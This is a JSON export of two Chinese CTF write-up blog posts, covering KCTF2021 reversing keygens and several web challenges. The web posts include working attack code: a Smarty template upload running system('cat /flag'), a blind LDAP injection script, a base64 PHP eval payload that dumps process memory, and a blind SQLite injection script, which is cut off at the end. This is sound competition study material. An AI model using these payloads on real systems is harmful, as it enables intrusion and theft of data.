[{"content":"有些题还是很值得补的，最近没什么时间，假期补吧（\n第一题 签到 这题还是比较容易的，需要一点点动调的经验\n上张队友的截图吧，懒得自己截了\n\r\n动调看看内存就知道，流程是：\nserial-\u0026gt;十进制-\u0026gt;与name的crc异或-\u0026gt;计算crc\n最后需要是一个固定的值，于是只需要想办法反解就行了\n这里注意到了一个事情，那就是图中看似是对 v6 的 crc 结果做了约束，其实是对 v6 本身进行了约束\n由于题目给了一个实例的 name 和 serial，我们只需要动调拿到这个的 v6，就知道能通过验证的 v6 是多少了\n接下来动调拿一下 KCTF 的 crc，这个的结果再异或一下目标的 v6，就得到serial了\n 靠记忆写的，希望没错\n 第二题 迷失丛林  这题就直接放提交的wp了\n 很容易定位到程序的输入\n\r\n输入长度为32，需要通过 sub_4014A0, sub_401580 的验证\n4014A0 较为简单，是个经典的hexstr转成char存到 4041F0 这个地址，最后的16是计算转换后的长度，所以输入就是 [0-9A-F]{32}\n随后将输入的前八字节存入 404000 中，剩下的部分传参进 sub_401580\n要想让该函数返回1，需要先通过如下的if验证\n\r\n简单看一下使用的变量，应该是对前八字节的输入进行的验证\n\r\n结合动调发现大概就是根据404000数组，构成一个 \u0026lt;value, index\u0026gt; 的结构，两两存放到404420当中\n分析了一下404000数组的作用和特征，发现这个数组应该是构成一个环状的结构（以当前数值作为索引寻找下一个数），猜测不能有重复的数字，否则可能会构成小循环之类的，用脚本验证了一下发现后面248个数字果然没有重复，于是将前八字节的取值可能锁定到了 0x1e, 0x28, 0x4b, 0x6d, 0x8c, 0xa3, 0xd2, 0xfb 中，总共有 $8!=40320$ 种可能，完全可以爆破\n把ida代码复制下来改一改\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdint.h\u0026gt;#include \u0026lt;algorithm\u0026gt;#include \u0026lt;cstring\u0026gt; unsigned char byte_404000[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA2, 0x9B, 0xF4, 0xDF, 0xAC, 0x7C, 0xA1, 0xC6, 0x16, 0xD0, 0x0F, 0xDD, 0xDC, 0x73, 0xC5, 0x6B, 0xD1, 0x96, 0x47, 0xC2, 0x26, 0x67, 0x4E, 0x41, 0x82, 0x20, 0x56, 0x9A, 0x6E, 0x33, 0x92, 0x88, 0x29, 0xB5, 0xB4, 0x71, 0xA9, 0xCE, 0xC3, 0x34, 0x50, 0x59, 0xBF, 0x2D, 0x57, 0x22, 0xA6, 0x30, 0x04, 0xB2, 0xCD, 0x36, 0xD5, 0x68, 0x4D, 0x5B, 0x45, 0x9E, 0x85, 0xCF, 0x9D, 0xCC, 0x61, 0x78, 0x32, 0x76, 0x31, 0xE3, 0x80, 0xAD, 0x39, 0x4F, 0xFA, 0x72, 0x83, 0x4C, 0x86, 0x60, 0xB7, 0xD7, 0x63, 0x0C, 0x44, 0x35, 0xB3, 0x7B, 0x19, 0xD4, 0x69, 0x08, 0x0B, 0x1F, 0x3D, 0x11, 0x79, 0xD3, 0xEE, 0x93, 0x42, 0xDE, 0x23, 0x3B, 0x5D, 0x8D, 0xA5, 0x77, 0x5F, 0x58, 0xDB, 0x97, 0xF6, 0x7A, 0x18, 0x52, 0x15, 0x74, 0x25, 0x62, 0x2C, 0x05, 0xE8, 0x0D, 0x98, 0x2A, 0x43, 0xE2, 0xEF, 0x48, 0x87, 0x49, 0x1C, 0xCA, 0x2B, 0xA7, 0x8A, 0x09, 0x81, 0xE7, 0x53, 0xAA, 0xFF, 0x6F, 0x8E, 0x91, 0xF1, 0xF0, 0xA4, 0x46, 0x3A, 0x7D, 0x54, 0xEB, 0x2F, 0xC1, 0xC0, 0x0E, 0xBD, 0xE1, 0x6C, 0x64, 0xBE, 0xE4, 0x02, 0x3C, 0x5A, 0xA8, 0x9F, 0x37, 0xAF, 0xA0, 0x13, 0xED, 0x1B, 0xEC, 0x8B, 0x3E, 0x7E, 0x27, 0x99, 0x75, 0xAB, 0xFE, 0xD9, 0x3F, 0xF3, 0xEA, 0x70, 0xF7, 0x95, 0xBA, 0x1D, 0x40, 0xB0, 0xF9, 0xE5, 0xF8, 0x06, 0xBC, 0xB6, 0x03, 0xC9, 0x10, 0x9C, 0x2E, 0x89, 0x5C, 0x7F, 0xB1, 0x1A, 0xD6, 0x90, 0xAE, 0xDA, 0xE6, 0x5E, 0xB9, 0x84, 0xE9, 0x55, 0xBB, 0xC7, 0x0A, 0xE0, 0x66, 0xF2, 0xD8, 0xCB, 0x00, 0x12, 0xB8, 0x17, 0x94, 0x6A, 0x4A, 0x01, 0x24, 0x14, 0x51, 0x07, 0x65, 0x21, 0xC8, 0x38, 0xFD, 0x8F, 0xC4, 0xF5, 0xFC }; unsigned char byte_404220[520]; unsigned char byte_404420[65537]; int dword_404100[] = {2, 4, 8, 0x10, 0x20, 0x40, 0x80, 0}; using namespace std; int sub_401580(unsigned char *a2) { int v2; // ebp  unsigned char *v3; // eax  int *v4; // esi  unsigned char *v5; // ecx  int v6; // edi  unsigned char *v7; // ecx  int v8; // edx  unsigned char *v9; // eax  int v10; // ecx  int v11; // esi  int v12; // eax  unsigned char v13; // dl  int v14; // edi  int v15; // eax  int v16; // ecx  int v17; // esi  int i; // eax  char v19; // dl  unsigned char v21; // [esp+10h] [ebp-Ch]  unsigned char v22; // [esp+11h] [ebp-Bh]  unsigned char v23; // [esp+12h] [ebp-Ah]  unsigned char v24; // [esp+13h] [ebp-9h]  unsigned char *v25; // [esp+14h] [ebp-8h]  v21 = 0; v22 = 0; v23 = 0; v24 = 0; v2 = 1; v25 = byte_404420; for (i = 0; i \u0026lt; 8; i++) byte_404000[i] = a2[i]; do { byte_404220[0] = byte_404000[v2 - 1]; byte_404220[1] = v2; v3 = byte_404220; v4 = dword_404100; v5 = \u0026amp;byte_404220[dword_404100[0]]; do { v6 = *v4; // 2, 4, 8, 10h, 20h, 40h, 80h  if ( *v4 \u0026gt; 0 ) { do { v7 = v5 + 1; *(v7 - 1) = byte_404000[*v3]; *v7 = *v3 + 1; v5 = v7 + 1; ++v3; --v6; } while ( v6 ); } ++v4; } while ( v4 \u0026lt; \u0026amp;(dword_404100[7]) ); v8 = 256; do { ++v25[*v3++]; --v8; } while ( v8 ); ++v2; v25 += 256; } while ( v2 - 1 \u0026lt; 256 ); v9 = \u0026amp;byte_404420[0x28]; v10 = 256; do { if ( *(v9 - 40) ) ++v21; if ( *(v9 - 26) ) ++v22; if ( *v9 ) ++v23; if ( v9[39] ) ++v24; v9 += 256; --v10; } while ( v10 ); if ( v21 == 0xA9 \u0026amp;\u0026amp; v22 == 0xAC \u0026amp;\u0026amp; v23 == 0xA7 \u0026amp;\u0026amp; v24 \u0026gt; 0xC8u ){ for (i = 0; i \u0026lt; 8; i++){ printf(\u0026#34;%hhX\u0026#34;, a2[i]); } } return 0; } int main(){ unsigned char flag[] = {0x1e, 0x28, 0x4b, 0x6d, 0x8c, 0xa3, 0xd2, 0xfb}; do{ memset(byte_404420, 0, 65536); sub_401580(flag); }while (next_permutation(flag, flag + 8)); return 0; } 转换一下得到前八字节 B4D682C8BF2DE13A\n确定前八字节后，只需要关注和参数（后八字节）有关的部分了，中间全部动调跳过\n\r\n这一部分程序相较来说就简单了不少，主要是根据404000开头的八个字节作为初始值，每个字节单独与输入的八个字节进行运算，根据末尾bit决定是+1还是找索引，最终目的是凑成 GoodJob~ 这个字符串（sub_4024C0 是个字符串比较）\n可以使用搜索之类的，但考虑到每个字节是单独运算的，常规爆破也只需要 0x800 的运算量，所以还是直接爆破了\n#include \u0026lt;stdio.h\u0026gt; unsigned char byte_414420[] = {0xC1, 0x9B, 0x7F, 0x58, 0x64, 0xD5, 0x77, 0x21}; unsigned char byte_404000[] = { 0xC1, 0x9B, 0x7F, 0x58, 0x64, 0xD5, 0x77, 0x21, 0x74, 0xEB, 0x14, 0xBF, 0xDF, 0x25, 0x5A, 0x37, 0x85, 0x2C, 0xAF, 0x8C, 0xDA, 0x26, 0xE2, 0x7A, 0x87, 0x4C, 0x60, 0x99, 0x54, 0x3C, 0x95, 0xC0, 0xB9, 0x0C, 0xBC, 0x0E, 0xE7, 0x2D, 0x86, 0xBE, 0x67, 0xD3, 0xD8, 0xFC, 0x30, 0xB6, 0xC8, 0x57, 0x1E, 0x62, 0x3E, 0xCE, 0xA0, 0xCD, 0xF5, 0xEE, 0xA7, 0xCF, 0x45, 0xFE, 0xD0, 0x80, 0x05, 0xAD, 0x13, 0xF3, 0xB7, 0x6B, 0x22, 0x2B, 0xBD, 0x69, 0x42, 0x4B, 0xA5, 0xEA, 0xA6, 0xD2, 0x6F, 0x4F, 0x4E, 0x07, 0xE1, 0x36, 0x01, 0xB5, 0xAA, 0xB1, 0x94, 0x0B, 0x35, 0x3A, 0xC7, 0x49, 0x53, 0x82, 0xC3, 0x7B, 0x32, 0xFF, 0x19, 0xC4, 0xF1, 0xC9, 0xE8, 0xF7, 0x56, 0x15, 0xA3, 0x46, 0x89, 0x43, 0x9D, 0x8F, 0x20, 0xEF, 0xBB, 0x2A, 0xCB, 0x09, 0x93, 0x4A, 0x1C, 0xE3, 0x33, 0xD1, 0xE0, 0x1D, 0x72, 0x7C, 0x27, 0xE9, 0x17, 0x28, 0x6D, 0x6A, 0xD9, 0x00, 0x9A, 0xE5, 0x63, 0xDE, 0x23, 0x9F, 0x0D, 0x47, 0x3B, 0x65, 0x08, 0x84, 0x6C, 0x1A, 0x88, 0x12, 0xA1, 0xA4, 0xB3, 0x18, 0x24, 0x1B, 0xD7, 0x44, 0xDB, 0xAC, 0x6E, 0x7D, 0x51, 0x5E, 0xED, 0x50, 0xD6, 0x11, 0x5B, 0x9C, 0xB4, 0x68, 0x3D, 0x2F, 0x03, 0x40, 0xBA, 0x2E, 0xCA, 0x02, 0xE6, 0xA8, 0xEC, 0x83, 0x06, 0x5D, 0xB8, 0x4D, 0x97, 0x66, 0xF0, 0xFB, 0x8A, 0x55, 0xAB, 0xB2, 0x04, 0xFA, 0x0A, 0x31, 0x71, 0xCC, 0x8B, 0x73, 0xA9, 0x48, 0x5C, 0xF9, 0x98, 0xE4, 0xC6, 0x34, 0xC5, 0x7E, 0x81, 0x75, 0x90, 0x1F, 0x92, 0x3F, 0x9E, 0x10, 0x29, 0x52, 0x39, 0xF4, 0x41, 0x78, 0x5F, 0x16, 0x79, 0xC2, 0xB0, 0xDD, 0xF2, 0x61, 0x0F, 0x70, 0xD4, 0x91, 0xDC, 0xF6, 0xF8, 0xFD, 0x59, 0x38, 0x8D, 0x96, 0xAE, 0x8E, 0x76, 0xA2 }; int calc(unsigned char a2, int i){ int v17; // esi  char v19; // dl  v17 = 0; do { if ( v17 \u0026gt;= 8 ) { if ( !i || i == 7 ) --byte_414420[i]; } else { if ( (a2 \u0026amp; 1) != 0 ) v19 = byte_414420[i] + 1; else v19 = byte_404000[byte_414420[i]]; byte_414420[i] = v19; a2 \u0026gt;\u0026gt;= 1; } ++v17; } while ( v17 \u0026lt; 9 ); return byte_414420[i]; } int main(){ int i = 0; unsigned char a = 0; unsigned char b[] = \u0026#34;GoodJob~\u0026#34;; for (int j = 0; j \u0026lt; 8; j++){ for (i = 0; i \u0026lt; 0x100; i++){ a = i \u0026amp; 0xff; for (int k = 0; k \u0026lt; 8; k++){ byte_414420[k] = byte_404000[k]; } calc(a, j); if (byte_414420[j] == b[j]) printf(\u0026#34;%d %x\\n\u0026#34;, j, a); } } return 0; } 最后得到下半段验证码 D9B6AEF24A80CB22\n第七题 声名远扬  这题做完后懒了，没有交wp\n 初步分析了一下，看到一些字符串，发现这题用了 duilib 架构\n很多人的 wp 写的是用虚表找到验证函数，但我对虚表不太了解，做题的时候是用的动调下断点的方式做的\n动调的时候搜索字符串，发现能找到输入，然后在输入处下个硬件断点，能够断到 strlen，出来后还能看到 strncpy，但在这里断是不对的，因为没有点击检查，所以无论如何也进不了验证函数，于是朋友在获取消息的地方加了个消息断点，这时候再用硬件断点断下来，然后不断取消当前断点，在 strncpy 到的地方下新的断点，就能够进入到加密函数\n\r\n这个 base64 应该还是很容易看出来的，但动调拿结果能发现明显换表了，函数往里跟也不好跟，于是直接用动调拿结果\n这里构造了一个长度为 50 的输入，能够得到所有的 base64 字符\n输入：n++j'^aKgJ9*|an@@o$|8)9z#-;\u0026lt;\u0026lt;v789ghistu:/\u0026gt;^c?,/@YZ\n标准表下的输出：bisraideYUtnSjkqfGFuQEBvJHw4KTl6Iy07PDx2Nzg5Z2hpc3R1Oi8+XmM/LC9AWVo=\n这个输入就可以总结出这个题的 base 表了\nprvo9CHSJOcPIb6xRVUXQz0qBGDE72LNZduaefYT5K_8-4FAhlimjkngt1yMWs3w!\n接下来继续用动调找验证函数\n\r\n可以看到 v17 = xxx | 0x3300000000\n而最后的 call 是 MK_FP(WORD2(v17), v17)()\n结合着 32 位程序，猜测是一个天堂之门\n把调用的函数取出来，ida64 反编译一下\n\r\n这个函数大致猜测一下，显然是要求 v8 == v9[v28 - a1] 一直成立\n一开始的 do while 循环是对目标密文做了个解密，于是动调到验证的地方看一下内存\nGYldGg-iIoJlPX9hPXpjPqfdEY21B01TBTzeGqfKNR!!\n前面已经知道了 ! 就是这里 base64 的填充，于是这个字符串就是密文了\n换表 base64 的解密\n把表换回来之后的密文：\nZmxhZ3syMDIxLTEwLTA0LXlhbmd5YW5nYnVkZXlpfQ==\n明显的 flag 标志 Zmxh\n","date":"2021-12-23T22:23:17+08:00","image":"https://or4ngesec.github.io/post/kctf2021-fall-writeup-by-or4nge/cover_hufd6827b5e92508a15177056d76ff05d4_2462797_120x120_fill_box_smart1_3.png","permalink":"https://or4ngesec.github.io/post/kctf2021-fall-writeup-by-or4nge/","title":"KCTF2021 Fall Writeup by or4nge"},{"content":"* 开头题目表示赛后补题\nWeb [签到]flag 等一个一个拼出来，业余web手的笨B做题法\n[萌]odd_upload 题目描述：目录结构与官方项目example相同\n所以去查看smarty的目录结构，同时上传文件发现过滤了php相关的很多后缀，但.tpl没有过滤，同时可以控制上传的目录，所以向./templates目录上传header.tpl覆盖原有的内容，添加一句：{system('cat /flag')}，之后再重新访问题目链接就能获取flag。\n\r\nflag{1ae85554-c785-4321-8d77-0f68974929f8}\neasyinject 源码中提示了用户名为guest，密码为EC77k8RHquAMLKAX，登陆后提示\nThe flag is a special email address username.It is attribute of one account and there are multiple accounts in the directory. flag is composed of a-z0-9_\n说实话这个提示看得我云里雾里，attribute我能理解，directory是啥？\n按照常规sql注入没发现什么注入点，但是用fuzz跑的时候发现如果用户名含有'(\u0026lsquo;或者\u0026rsquo;)\u0026lsquo;就会报错：\nWarning: ldap_search(): Search: Bad search filter in /var/www/html/index.php on line 48 Warning: ldap_get_entries() expects parameter 2 to be resource, boolean given in /var/www/html/index.php on line 49 有报错就好说了，后端用的是ldap协议，flag是某个用户的用户名，可以直接用通配符*盲注，由于有多个用户，需要递归查找，exp如下：\nimport requests url = \u0026#34;http://47.106.172.144:2333/\u0026#34; alphabet = \u0026#39;abcdefghijklmnopqrstuvwxyz0123456789_\u0026#39; def search(flag): for c in alphabet: # print(flag+c+\u0026#39;*\u0026#39;) r = requests.get(url, params={\u0026#39;user\u0026#39;:flag+c+\u0026#39;*\u0026#39;, \u0026#39;pass\u0026#39;:\u0026#39;1\u0026#39;}) if \u0026#39;找不到用户\u0026#39; in r.text: pass elif \u0026#39;查询用户不唯一\u0026#39; in r.text or \u0026#39;密码错误\u0026#39; in r.text: # print(c+\u0026#39;\\n\u0026#39;+r.text) print(flag+c) search(flag+c) else: print(\u0026#39;Error: [\u0026#39;+c+\u0026#39;]\\n\u0026#39;+r.text) search(\u0026#39;\u0026#39;) *hideandseek 和web没有啥关系，和二进制全是关系。\n先附上打本地的DockerFile:\nFROMphp:8.1.0ADD ./src /var/www/htmlADD ./flag /flagWORKDIR/var/www/html/RUN chmod -R 0555 /var/www/html/CMD [\u0026#34;php\u0026#34;, \u0026#34;-S\u0026#34;, \u0026#34;0.0.0.0:8000\u0026#34;, \u0026#34;-t\u0026#34;, \u0026#34;/var/www/html\u0026#34;]这题上先读flag，然后把flag给覆盖了，你只有一次执行任意代码的机会。\n思路上来一下子就指向了/proc，进程目录，我们肯定是能通过分析这个进程把flag拿到了。目前已知的/proc的博客有：\n https://whoamianony.top/2021/06/09/Web%E5%AE%89%E5%85%A8/Proc%20%E7%9B%AE%E5%BD%95%E5%9C%A8%20CTF%20%E4%B8%AD%E7%9A%84%E5%A6%99%E7%94%A8/\nhttps://xz.aliyun.com/t/10579\n 第一反应是读fd，看看文件的符号链接，如果fopen了，但没fclose就有可能在fd里找到，本地一试发现没有。\n于是考虑利用别的，比如./exe，是一个ELF文件，但可惜strings ./exe没用，因为flag变量是在运行时读取的，生成elf是不存在这个字符串的，于是就读./mem，/proc/{PID}/mem是可用于访问进程的内存的页面。但是发现读取失败了，报错如下：\ncat mem: Input/output error 搜到了解释原因：https://unix.stackexchange.com/questions/6301/how-do-i-read-from-proc-pid-mem-under-linux\n/proc/$pid/mem显示$pid 内存的内容与进程中的映射方式相同，即伪文件中偏移x处的字节与进程中地址x处的字节相同。如果在进程中未映射地址，则从文件中的相应偏移量读取返回EIO（输入/输出错误）。例如，由于进程中的第一页永远不会被映射（因此取消引用NULL指针会完全失败，而不是无意中访问实际内存），因此读取 的第一个字节/proc/$pid/mem总是会产生 I/O 错误。\n同时也拿到了一份用python拿内存信息的脚本：\nimport re maps_file = open(\u0026#34;/proc/self/maps\u0026#34;, \u0026#39;r\u0026#39;) mem_file = open(\u0026#34;/proc/self/mem\u0026#34;, \u0026#39;rb\u0026#39;, 0) output_file = open(\u0026#34;self.dump\u0026#34;, \u0026#39;wb\u0026#39;) for line in maps_file.readlines(): # for each mapped region m = re.match(r\u0026#39;([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])\u0026#39;, line) if m.group(3) == \u0026#39;r\u0026#39;: # if this is a readable region start = int(m.group(1), 16) end = int(m.group(2), 16) mem_file.seek(start) # seek to region start chunk = mem_file.read(end - start) # read region contents output_file.write(chunk) # dump contents to standard output maps_file.close() mem_file.close() output_file.close() 我盲猜flag就在内存里，但我也不是打二进制的，也不知道在哪，于是就打算把整个chunk全部正则匹配即可。\n把上述代码翻译成php，修改部分内容如下：\n\u0026lt;?php $maps_file = fopen(\u0026#34;/proc/self/maps\u0026#34;, \u0026#34;r\u0026#34;); $mem_file = fopen(\u0026#34;/proc/self/mem\u0026#34;, \u0026#34;rb\u0026#34;); while(! feof($maps_file)) { $line = fgets($maps_file);//fgets()函数从文件指针中读取一行  $m = preg_match(\u0026#34;/([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])/\u0026#34;, $line, $match); if($match[3] == \u0026#39;r\u0026#39;) { $start = hexdec($match[1]); $end = hexdec($match[2]); fseek($mem_file, $start); $chunk = fread($mem_file, $end - $start); if(preg_match(\u0026#34;/flag\\{.*\\}/\u0026#34;, $chunk)) { preg_match(\u0026#34;/(flag\\{.*\\})/\u0026#34;, $chunk, $ans); var_dump($ans); } } } fclose($maps_file); fclose($mem_file); ?\u0026gt;最后用base64+urlencode传参（有了安洵杯的教训，base64一定要编码），最终payload如下：\nhttp://5b599005-3dfe-44e4-ac13-96fc3b194f3e.nssctf.neusoft.edu.cn/?eval=eval(base64_decode(%22JG1hcHNfZmlsZSA9IGZvcGVuKCIvcHJvYy9zZWxmL21hcHMiLCAiciIpOwokbWVtX2ZpbGUgPSBmb3BlbigiL3Byb2Mvc2VsZi9tZW0iLCAicmIiKTsKd2hpbGUoISBmZW9mKCRtYXBzX2ZpbGUpKSB7CiAgICAgICAgJGxpbmUgPSBmZ2V0cygkbWFwc19maWxlKTsvL2ZnZXRzKCnlh73mlbDku47mlofku7bmjIfpkojkuK3or7vlj5bkuIDooYwKICAgICAgICAgICAgJG0gPSBwcmVnX21hdGNoKCIvKFswLTlBLUZhLWZdKyktKFswLTlBLUZhLWZdKykgKFstcl0pLyIsICRsaW5lLCAkbWF0Y2gpOwogICAgICAgICAgICBpZigkbWF0Y2hbM10gPT0gJ3InKSB7CiAgICAgICAgICAgICAgICAgICAgJHN0YXJ0ID0gaGV4ZGVjKCRtYXRjaFsxXSk7CiAgICAgICAgICAgICAgICAgICAgICAgICRlbmQgPSBoZXhkZWMoJG1hdGNoWzJdKTsKICAgICAgICAgICAgICAgICAgICAgICAgZnNlZWsoJG1lbV9maWxlLCAkc3RhcnQpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNodW5rID0gZnJlYWQoJG1lbV9maWxlLCAkZW5kIC0gJHN0YXJ0KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKHByZWdfbWF0Y2goIi9mbGFnXHsuKlx9LyIsICRjaHVuaykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByZWdfbWF0Y2goIi8oZmxhZ1x7LipcfSkvIiwgJGNodW5rLCAkYW5zKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyX2R1bXAoJGFucyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KfQpmY2xvc2UoJG1hcHNfZmlsZSk7CmZjbG9zZSgkbWVtX2ZpbGUpOw%3D%3D%22)); *wschat 前后端交互用的是socket io，参数格式用的是protobuf，前端的js加了很多混淆和反调试。可以在这个网站https://lelinhtinh.github.io/de4js/做个简单的恢复后再看。\n贴一下我恢复后的还算是能看的关键代码：\n\u0026lt;html\u0026gt; ... \u0026lt;script src=\u0026#34;//cdn.bootcss.com/socket.io/2.1.1/socket.io.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;protobuf.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; ... let sock = io.connect(\u0026#39;ws://\u0026#39; + window.location.host + \u0026#39;/\u0026#39;); var WSMessage, wsmessage, buffer; protobuf.load(\u0026#39;chat.proto\u0026#39;, function (err, _0x75e501) { if (err) throw err; LoginReq = _0x75e501.lookup(\u0026#39;wschat.chat.LoginReq\u0026#39;), RegReq = _0x75e501.lookup(\u0026#39;wschat.chat.RegReq\u0026#39;), ServerRsp = _0x75e501.lookup(\u0026#39;wschat.chat.ServerRsp\u0026#39;), MsgReq = _0x75e501.lookup(\u0026#39;wschat.chat.MsgReq\u0026#39;), LogoutReq = _0x75e501.lookup(\u0026#39;wschat.chat.LogoutReq\u0026#39;); }), window.onload = function () { let _0x1f4215 = \u0026#39;\u0026#39;, btn1 = document.getElementById(\u0026#39;btn1\u0026#39;), btn2 = document.getElementById(\u0026#39;btn2\u0026#39;), btn_send = document.getElementById(\u0026#39;btn_send\u0026#39;), user = document.getElementById(\u0026#39;user\u0026#39;), pass = document.getElementById(\u0026#39;pass\u0026#39;), txt1 = document.getElementById(\u0026#39;txt1\u0026#39;), ul1 = document.getElementById(\u0026#39;ul1\u0026#39;); btn1.onclick = function () { var _0x3689c9 = RegReq.create({ \u0026#39;username\u0026#39;: user.value, \u0026#39;password\u0026#39;: pass.value }), _0x38c60d = RegReq.encode(_0x3689c9).finish(); sock.emit(\u0026#39;reg\u0026#39;, _0x38c60d.slice().buffer); }, sock.on(\u0026#39;reg_ret\u0026#39;, (_0x77442, _0x4d8078) =\u0026gt; { _0x77442 ? alert(_0x4d8078) : alert(_0x4d8078); }), btn2.onclick = function () { if (!/^\\w{1,16}$/ [\u0026#39;test\u0026#39;](user.value)) { alert(\u0026#39;用户名不符合规范\u0026#39;); return; } if (!/^\\w{1,16}$/ [\u0026#39;test\u0026#39;](pass.value)) { alert(\u0026#39;密码不符合规范\u0026#39;); return; } var _0xea8ad4 = LoginReq.create({ \u0026#39;username\u0026#39;: user.value, \u0026#39;password\u0026#39;: pass.value }), _0x581e63 = LoginReq.encode(_0xea8ad4).finish(); sock.emit(\u0026#39;login\u0026#39;, _0x581e63.slice().buffer); }, sock.on(\u0026#39;login_ret\u0026#39;, (_0x253784, _0x4ca143) =\u0026gt; { _0x253784 ? alert(_0x4ca143) : (_0x1f4215 = user.value, alert(_0x4ca143)); }), btn_send.onclick = function () { var _0x254c70 = MsgReq.create({ \u0026#39;msg\u0026#39;: txt1.value }), _0x56ebdb = MsgReq.encode(_0x254c70).finish(); sock.emit(\u0026#39;msg\u0026#39;, _0x56ebdb.slice().buffer); }, sock.on(\u0026#39;msg\u0026#39;, (_0x2378cb, _0x4ce8f4) =\u0026gt; { let _0x3ca130 = document.createElement(\u0026#39;li\u0026#39;); _0x3ca130.innerHTML = \u0026#39;\u0026lt;h3\u0026gt;\u0026#39; + _0x2378cb + \u0026#39;\u0026lt;/h3\u0026gt;\u0026lt;p\u0026gt;\u0026#39; + _0x4ce8f4 + \u0026#39;\u0026lt;/p\u0026gt;\u0026#39;, ul1.appendChild(_0x3ca130); }), sock.on(\u0026#39;msg_ret\u0026#39;, (_0x491ba1, _0x25dec1) =\u0026gt; { if (_0x491ba1) alert(\u0026#39;发送失败：\u0026#39; + _0x25dec1); else { let _0x4a7033 = document.createElement(\u0026#39;li\u0026#39;); _0x4a7033.className = \u0026#39;mine\u0026#39;, _0x4a7033.innerHTML = \u0026#39;\u0026lt;h3\u0026gt;\u0026#39; + _0x1f4215 + \u0026#39;\u0026lt;/h3\u0026gt;\u0026lt;p\u0026gt;\u0026#39; + txt1.value + \u0026#39;\u0026lt;/p\u0026gt;\u0026#39;, ul1.appendChild(_0x4a7033), txt1.value = \u0026#39;\u0026#39;; } }); }, setInterval(function () { _0x6c017f(); }, 4000); ... \u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; 这段代码引入了socket io和protobuf，socket io有reg、reg_ret、login、login_ret、msg、msg_ret事件，传递的参数均使用protobuf打包，看一下protobuf定义文件chat.proto：\npackage wschat; message chat { message LoginReq { required string username = 1; required string password = 2; } message RegReq { required string username = 1; required string password = 2; } message ServerRsp { required int32 retcode = 1; optional string reply = 2; } message MsgReq { required string msg = 1; } message LogoutReq { } } 回到上面的代码，其中登录接口是前端校验，限制用户名密码只能为1-16位字母数字下划线，前端校验可以用burp替换为空。\n题目中提示网站为nodejs + sqlite，尝试一下sqlite注入，首先注册一个用户名密码均为admin的账户，然后用户名输入admin\u0026rsquo;，密码admin，提示数据库出错，用户名尝试admin'\u0026ndash;，提示登录成功，存在注入点。\n由于是盲注，socket io实现又很慢，只能硬撸出一个脚本。参考 https://developers.google.com/protocol-buffers/docs/pythontutorial 实现protobuf，参考 https://python-socketio.readthedocs.io/en/latest/ 实现socket io。\n在 https://developers.google.com/protocol-buffers/docs/downloads 下载protoc，然后把.proto文件编译成python文件：\nprotoc -I=chat.proto目录 --python_out=输出目录 chat.proto路径 然后运行脚本：\nimport socketio import time import string import chat_pb2 url = \u0026#39;http://4b89d5d3-7df8-4a8c-9352-08dbc410f835.nssctf.neusoft.edu.cn/\u0026#39; sio = socketio.Client() LoginReq = chat_pb2.chat.LoginReq() RegReq = chat_pb2.chat.RegReq() ServerRsp = chat_pb2.chat.ServerRsp() MsgReq = chat_pb2.chat.MsgReq() LogoutReq = chat_pb2.chat.LogoutReq() # alphabet = string.ascii_letters + string.digits + \u0026#39;{_.,}\u0026#39; # alphabet = string.printable + string.whitespace alphabet = string.ascii_lowercase + string.digits @sio.event def reg_ret(err, data): global _err, _data, recvFlag # print(err, data) _err = err _data = data recvFlag = True @sio.event def login_ret(err, data): global _err, _data, recvFlag # print(err, data) _err = err _data = data recvFlag = True @sio.event def msg(title, content): print(title, content) @sio.event def msg_ret(err, data): print(err, data) @sio.event def connect(): print(\u0026#39;connection established\u0026#39;) @sio.event def disconnect(): print(\u0026#39;disconnected from server\u0026#39;) def register(username=\u0026#39;admin\u0026#39;, password=\u0026#39;admin\u0026#39;): RegReq.username = username RegReq.password = password sio.emit(\u0026#39;reg\u0026#39;, RegReq.SerializeToString()) while not recvFlag: pass err, data = _err, _data init() return err, data def login(username=\u0026#39;admin\u0026#39;, password=\u0026#39;admin\u0026#39;): LoginReq.username = username LoginReq.password = password sio.emit(\u0026#39;login\u0026#39;, LoginReq.SerializeToString()) while not recvFlag: pass err, data = _err, _data init() return err, data def init(): global recvFlag, _err, _data recvFlag = False _err = None _data = None if __name__ == \u0026#39;__main__\u0026#39;: sio.connect(url) init() register() # payload = \u0026#34;select group_concat(tbl_name) from sqlite_master where type=\u0026#39;table\u0026#39;\u0026#34; # payload = \u0026#34;select sql from sqlite_master where type=\u0026#39;table\u0026#39; and tbl_name=\u0026#39;f16g_1s_1n_th1s_table\u0026#39;\u0026#34; payload = \u0026#34;select group_concat(f16g) from f16g_1s_1n_th1s_table\u0026#34; length = 0 for i in range(1, 100): err, data = login(\u0026#34;admin\u0026#39; and length((%s))=%d--\u0026#34;%(payload, i)) # print(err, data) if err == 1: pass elif err == 0: length = i break else: print(\u0026#39;Error!\u0026#39;, err, data) print(\u0026#39;Length:\u0026#39;, length) # length = 6 flag = \u0026#39;\u0026#39; for i in range(1, length+1): found = False for c in alphabet: err, data = login(\u0026#34;admin\u0026#39; and hex(substr((%s),%d,1))=\u0026#39;%s\u0026#39;--\u0026#34;%(payload, i, c.encode().hex())) # print(flag+c, err, data) if err == 1: pass elif err == 0: found = True flag += c print(flag) break else: print(\u0026#39;Error!\u0026#39;, err, data) if not found: flag += \u0026#39;\\0\u0026#39; # version: 3.34.0 # table: user_table,sqlite_sequence,f1ag_not_in_here,test_table,f16g_1s_1n_th1s_table # column: \u0026#34;f16g\u0026#34; TEXT # f ag 34e7472f ffcf 400d aec3 a3b4fe390c1d  # flag{34e7472f-ffcf-400d-aec3-a3b4fe390c1d} sio.disconnect() 吐槽一下，socket 